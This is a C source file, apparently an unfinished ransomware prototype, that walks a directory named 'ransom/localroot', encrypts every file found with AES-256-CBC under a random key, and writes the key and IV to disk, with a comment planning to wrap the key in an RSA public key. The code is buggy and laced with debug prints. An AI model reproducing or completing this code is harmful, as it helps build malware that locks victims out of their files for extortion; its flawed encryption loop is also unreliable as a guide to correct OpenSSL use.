#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string.h>
#include <math.h>

#define MAX_COMMAND 1024
#define KEY_SIZE 256
#define IV_SIZE 16

void handleErrors() {
    exit(1);
}


int encrypt(char buffer[MAX_COMMAND], unsigned char key[KEY_SIZE / 8], unsigned char iv[IV_SIZE]) {
    
    printf("\n NOW IN ENCRYPT FUNCTION \n");
    printf("buffer: %s\n", buffer);
    printf("key: %s\n", key);
    printf("iv: %s\n", iv);

    // !CHECK SIZE OF EACH FILE

    FILE *input_file = fopen(buffer, "rb");

    if (input_file == NULL) {

        printf("Couldn't Open %s, PepeSadge...", buffer);

        return(-1);

    }

    fseek(input_file, 0, SEEK_END);

    int input_file_size = ftell(input_file);

    printf("file size: %d bytes\n", input_file_size);

    fseek(input_file, 0, SEEK_SET);

    

    

    
 
    EVP_CIPHER_CTX *ctx;
 
    int len;
 
    int out_buffer_len;
 
    
    if(!(ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        handleErrors();
    }
    // ! group

// ^ NEED TO FIGURE OUT HOW TO RUN THIS MULTIPLE TIMES DEPENDING ON THE SIZE

    unsigned char out_buffer[255];

    printf("in file size boo: %d\n", input_file_size);
    
    if (input_file_size > 255) { // this is where you loop the updates
printf("got here1\n"); // we passed here
        char suffix[] = "TEMP";
printf("got here1\n"); // we passed here
        strcat(buffer, suffix);
printf("got here1\n"); // we passed here
        FILE *output_file = fopen(buffer, "ab");
        printf("got here1\n"); // we passed here
        unsigned char input_buffer[255];
printf("got here1\n"); // we passed here
        while (fread(input_buffer, sizeof(unsigned char), 255, input_file) > 0) {

            printf("got here1\n"); // !!!!! WE ARE ERRORING IN HERE OKAY
            
            EVP_EncryptUpdate(ctx, out_buffer, &len, input_buffer, 255); //! something to do with this thing. its running the encryption in blocks in the backend and i have no control over how i pass in my info
            out_buffer_len = len;
            printf("input buffer: %s\n", input_buffer);

            fwrite(out_buffer, sizeof(unsigned char), out_buffer_len, output_file);

            int inbuflen = strlen(input_buffer);

            for (int x = 0; x < inbuflen; x++) { // clear the in_buffer to ensure integrity

                input_buffer[x] = '\0';

            }

            for (int x = 0; x < out_buffer_len; x++) { // clear the out_buffer to ensure integrity

                out_buffer[x] = '\0';

            }

            // ! WRITE OUT_BUFFER TO THE FILE HERE WB MODE TO A TEMP FILE THAT GETS RENAMED TO THE ORIGINAL NAME
        }

        if (1 != EVP_EncryptFinal_ex(ctx, out_buffer + len, &len)) {

        handleErrors();

        }
        
        fclose(input_file);
        EVP_CIPHER_CTX_free(ctx);

        return 0;
        

    }
    else {

    printf("got here2\n"); // WHY IT GO HERE
        unsigned char input_buffer[255];
        
        fread(input_buffer, sizeof(unsigned char), 255, input_file);
        EVP_EncryptUpdate(ctx, out_buffer, &len, input_buffer, input_file_size);
        out_buffer_len = len;
    }


    
    
    
    // ! HOW DO I MAKE OUT_BUFFER WORK FOR THIS CONTEXT IF THE INPUT FILE IS SO HUGE AND THE OUT_BUFFER ITERATES | IDK IF THIS WORKS BUT I TMIGHT IDK
    if (1 != EVP_EncryptFinal_ex(ctx, out_buffer + len, &len)) {

        handleErrors();

    }
    out_buffer_len += len;

    printf("out buffer: %s\n", out_buffer);
    printf("out buffer SIZEEEEE: %d\n", out_buffer_len);
    
    char suffix[] = "TEMP";

    strcat(buffer, suffix);

    FILE *output_file = fopen(buffer, "wb");

    fwrite(out_buffer, sizeof(unsigned char), out_buffer_len, output_file);
    fclose(input_file);
    fclose(output_file);
    
    EVP_CIPHER_CTX_free(ctx);

    return 0;

}

int main() {
    char command[MAX_COMMAND];
    char buffer[MAX_COMMAND];

    // Construct the find command
    snprintf(command, sizeof(command), "find /home/nixiuff/Desktop/ransom/localroot -type f");

    // Open a pipe to the command
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        perror("popen failed");
        return 1;
    }

    unsigned char key[KEY_SIZE / 8];
    unsigned char iv[IV_SIZE];
    
    // ! encrypt the key using a rsa public key and iv and put it into a txt file



    if (RAND_bytes(key, sizeof(key)) != 1 || RAND_bytes(iv, sizeof(iv)) != 1) {
        handleErrors();
    }
    
    // Read the output of the command line by line and store it in a variable
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        if (strlen(buffer) >= MAX_COMMAND - 1) {
        // Handle the case where the input string is too long
        fprintf(stderr, "Error: Input string exceeds maximum buffer size\n");
            continue; // Skip processing this input
        }
    
        // Do something with the file path (e.g., store it in an array)
        buffer[strlen(buffer) - 1] = '\0'; // Remove newline character
        encrypt(buffer, key, iv);
    }
    // Close the pipe
    pclose(pipe);

    FILE *keyFile = fopen("key.dat", "wb");
    FILE *ivFile = fopen("iv.dat", "wb");

    fwrite(key, sizeof(unsigned char), (KEY_SIZE / 8), keyFile);
    fwrite(iv, sizeof(unsigned char), IV_SIZE, ivFile);

    fclose(keyFile);
    fclose(ivFile);

    return 0;
}
